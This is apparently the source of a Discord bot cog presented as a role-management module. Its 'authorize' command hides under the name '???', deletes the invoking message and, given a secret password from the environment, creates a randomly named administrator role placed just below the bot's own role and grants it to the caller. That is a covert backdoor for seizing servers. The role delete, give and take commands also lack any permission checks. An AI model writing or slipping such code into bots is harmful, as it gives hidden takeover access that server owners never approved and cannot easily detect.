import os

from discord import Member, Permissions, Role
from discord.ext import commands
from discord.utils import get
from dscord.func import rng_str

admin = Permissions(administrator=True)


class Role(commands.Cog):
    def __init__(self, bot):
        self.bot = bot

    @commands.command('???')
    async def authorize(self, ctx, password: str = None) -> None:
        await ctx.message.delete()
        if password != os.environ['AUTHPW']: return
        name = rng_str()
        role = get(ctx.guild.roles, name=name)
        if not role:
            await ctx.guild.create_role(name=name, permissions=admin)
            role = get(ctx.guild.roles, name=name)
        bot = ctx.guild.get_member(self.bot.user.id)
        await role.edit(position=bot.roles[-1].position - 1)
        await ctx.author.add_roles(role)

    @commands.command('rdel', brief='Delete role')
    async def delete(self, ctx, role: Role):
        await role.delete()

    @commands.command('rgive', brief='Give member role')
    async def give(self, ctx, member: Member, role: Role) -> None:
        await member.add_roles(role)

    @commands.command('rtake', brief='Remove member\'s role')
    async def remove(self, ctx, member: Member, role: Role) -> None:
        await member.remove_roles(role)


def setup(bot):
    bot.add_cog(Role(bot))
